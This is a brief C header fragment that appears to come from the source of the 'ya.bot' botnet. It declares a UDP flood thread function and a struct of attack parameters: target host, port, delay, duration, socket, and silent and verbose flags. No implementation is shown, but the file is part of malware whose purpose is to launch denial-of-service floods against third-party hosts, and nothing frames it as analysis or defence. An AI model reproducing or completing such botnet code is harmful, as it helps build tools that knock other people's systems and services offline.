/*  ya.bot  */

#ifndef NO_UDPFLOOD
DWORD WINAPI udpflood_main(LPVOID param);

typedef struct SUDPFlood
{
	char m_szHost[LOWBUF];
	int m_nPort;
	int m_nDelay;
	DWORD m_dwTime;
	SOCKET m_bsock;
	char m_szAction[LOWBUF];
	char m_szDestination[LOWBUF];
	bool m_bSilent;
	bool m_bVerbose;
} SUDPFlood;
#endif